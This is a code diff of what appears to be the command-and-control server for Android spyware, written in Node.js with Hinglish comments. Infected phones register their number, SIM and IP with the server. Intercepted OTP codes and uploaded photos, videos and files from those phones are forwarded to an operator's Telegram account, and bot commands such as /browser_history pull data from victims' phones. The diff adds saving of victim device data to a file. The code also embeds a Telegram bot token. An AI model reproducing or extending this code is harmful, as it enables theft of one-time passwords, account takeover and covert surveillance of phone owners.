@@ -1,6 +1,8 @@
 const TelegramBot = require('node-telegram-bot-api');
-const axios = require('axios');
+const fs = require('fs');
+const path = require('path');
 const express = require('express');
+const axios = require('axios'); // ⚠️ AXIOS IMPORT ZAROORI HAI!
 
 const token = '8811118034:AAHr5UjOeT43-D4zPadC80V6dmQpgsyqIcM';
 const YOUR_USER_ID = 2062068620;
@@ -8,9 +10,21 @@ const bot = new TelegramBot(token, { polling: true });
 const app = express();
 app.use(express.json());
 
-let devices = {};
+// 📁 DATA STORE KARNE KE LIYE FILE
+const dataFile = path.join(__dirname, 'devices.json');
 
-// Device Register API
+// 📁 FILE SE DATA LOAD KARO
+let devices = {};
+if (fs.existsSync(dataFile)) {
+    devices = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
+}
+
+// 📁 DATA FILE MEIN SAVE KARO
+function saveDevices() {
+    fs.writeFileSync(dataFile, JSON.stringify(devices, null, 2));
+}
+
+// ✅ App ko Device Register karne do
 app.post('/api/register-device', (req, res) => {
     const { deviceId, deviceName, phoneNumber, battery, ip, sim, online, time } = req.body;
     devices[deviceId] = { 
@@ -23,24 +37,25 @@ app.post('/api/register-device', (req, res) => {
         time,
         lastSeen: Date.now() 
     };
+    saveDevices(); // ✅ DATA SAVE KARO
     res.json({ success: true });
 });
 
-// App ko commands bhejo (GET /api/commands?deviceId=...)
+// ✅ App ko commands bhejo (GET /api/commands?deviceId=...)
 app.get('/api/commands', (req, res) => {
     const { deviceId } = req.query;
     // Yahan command bhejne ka logic
     res.json({ command: 'status' });
 });
 
-// App se OTP aayega
+// ✅ App se OTP aayega
 app.post('/api/otp-data', (req, res) => {
     const { deviceId, otp } = req.body;
     bot.sendMessage(YOUR_USER_ID, `📩 OTP for device ${deviceId}: ${otp}`);
     res.json({ success: true });
 });
 
-// App se Photo/Video/File data aayega
+// ✅ App se Photo/Video/File data aayega
 app.post('/api/upload-data', (req, res) => {
     const { deviceId, type, data } = req.body;
     
@@ -56,6 +71,7 @@ app.post('/api/upload-data', (req, res) => {
     res.json({ success: true });
 });
 
+// ✅ Bot ko commands sunna hai
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
@@ -94,7 +110,7 @@ bot.onText(/\/help/, (msg) => {
         `🟢 **/browser_history <DEVICE_ID>** - Browser history nikalo\n` +
         `   Example: \`/browser_history 123456789\`\n\n` +
         `⚡ **Device ID kaise milega?**\n` +
-        `   → \`/devices\` command chalao, wahan device ID dikhega!`, { parse_mode: "Markdown" });
+        `   → \`/devices\` command chalao, wahan device ID dikhega!`);
 });
 
 bot.onText(/\/devices/, (msg) => {
@@ -135,7 +151,7 @@ bot.onText(/\/devices/, (msg) => {
     bot.sendMessage(chatId, message);
 });
 
-// Authorization check
+// ✅ Authorization check
 function isAuthorized(msg) {
     return msg.from.id === YOUR_USER_ID;
 }
